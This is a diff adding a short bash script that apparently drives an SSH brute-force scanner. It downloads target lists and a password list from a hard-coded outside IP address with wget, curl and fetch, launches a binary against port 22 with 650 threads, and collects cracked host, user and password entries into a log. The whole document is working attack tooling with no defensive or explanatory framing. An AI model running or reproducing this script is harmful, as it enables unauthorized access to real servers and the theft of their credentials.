@@ -1,0 +1,38 @@
+#!/bin/bash
+############### Config ###############
+ssh2Threads=650
+port=22
+ssh2Timeout=3
+
+rm -rf test
+rm -rf scan.log
+rm -rf *.pscan*
+rm -rf vuln.txt
+rm -rf nobash.txt
+rm -rf scan.log session.txt
+
+
+wget http://185.7.63.37/files/img/$1
+curl -O http://185.7.63.37/files/img/$1
+fetch http://185.7.63.37/files/img/$1
+rm -rf pass.txt*
+rm -rf p.txt*
+wget http://185.7.63.37/files/img/p.txt
+curl -O http://185.7.63.37/files/img/p.txt
+fetch http://185.7.63.37/files/img/p.txt
+sleep 3
+cat $1* |sort -u > scan.log
+cat p.txt* |sort -u >> pass.txt
+sleep 3
+rm -rf $1*
+sleep 1
+
+./b $ssh2Threads $port $ssh2Timeout unlimited
+
+sleep 60
+rm -rf t.log
+cat vuln.txt | cut -d " " -f3,4,5 --output-d=: >t.log
+cat nobash.txt | cut -d " " -f1,2,3 --output-d=: >>t.log
+sleep 4
+./print
+
